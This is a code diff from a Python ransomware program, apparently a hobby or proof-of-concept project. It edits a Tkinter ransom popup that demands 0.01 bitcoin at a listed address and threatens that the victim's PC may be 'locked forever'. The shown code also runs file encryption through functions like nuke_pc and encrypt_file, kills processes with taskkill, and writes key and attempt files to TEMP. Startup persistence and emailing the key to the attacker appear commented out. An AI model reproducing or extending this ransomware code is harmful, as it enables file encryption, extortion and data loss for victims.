@@ -57,9 +57,7 @@ def find_to_decrypt():
 
 def post_infect():
     # Infect the host with a malware after it has been decrypted, did you expect me to just let it free?
-
-    # Kill the program
-    os.system("taskkill /f /im stidium.exe")
+    pass
 
 
 def nuke_pc():
@@ -82,6 +80,12 @@ def nuke_pc():
     # Wait for all threads to complete
     for t in threads5:
         t.join()
+
+    # Kill the program
+    if sys.argv[0].endswith(".py"):
+        os.system(f"taskkill /f /im python.exe")
+    else:
+        os.system(f"taskkill /f /im {os.path.basename(__file__)}")
 
 
 def encrypt_file(file_path, key):
@@ -309,7 +313,8 @@ def popup_window(attack_id, key, email, attempts):
     tk.Label(root, text=f"Pay us 0.01 bitcoin and send the proof to {email} in order to receive the key \n"
                         f"Bitcoin Address: bc1q7mjcwx726a63d233w39nw2gxsuxpahpacu8e3c", fg='white', bg='dark red',
              font=('Helvetica', 16, 'bold')).pack()
-    tk.Label(root, text=f"Don't forget to put '{os.getlogin()}' and '{attack_id}' in the email", fg='white',
+    tk.Label(root, text=f"Don't forget to put '{os.getlogin()}' and '{attack_id}' in the email else "
+                        f"Your key wont be delivered (Note: Don't try bypassing this,\nyour pc might be locked forever if you try)", fg='white',
              bg='dark red', font=('Helvetica', 16, 'bold')).pack()
 
     # a function to update the timer and encrypted files list
@@ -412,7 +417,7 @@ def main():
         popup_window(attack_id, passw, RECEIVER, attempts_used)
 
     else:  # FIRSTRUN
-        insert_to_startup()
+        # insert_to_startup()
         decrypt_key = Fernet.generate_key()
         attempt = 5
         # Generate a key using the Fernet module
@@ -425,13 +430,17 @@ def main():
         file_find(decrypt_key)
 
         # Send the key and attack ID to the attacker's email address
-        # send_email(key, attack_id)
+        # send_email(decrypt_key, attack_id)
 
         # inject to start up and make a file called temp23.enc in c:\\temp to store the key because we are not monsters
         with open(os.path.join(os.environ["TEMP"], "temp23.txt.enc"), "w") as f:
             f.write(base64.b64encode(decrypt_key).decode())
         with open(f"C:\\Users\\{os.getlogin()}\\Downloads\\attack_id.txt", "w") as f:
             f.write(attack_id)
+        with open(os.path.join(os.environ["TEMP"], "pkg.txt.enc"), "w") as f:
+            f.write(str(attempt))
+            f.write("\n " + str(timer))
+            f.close()
 
         # Pop-up window with the attack ID and Email to send the key to the attacker
         popup_window(attack_id, decrypt_key, RECEIVER, attempt)
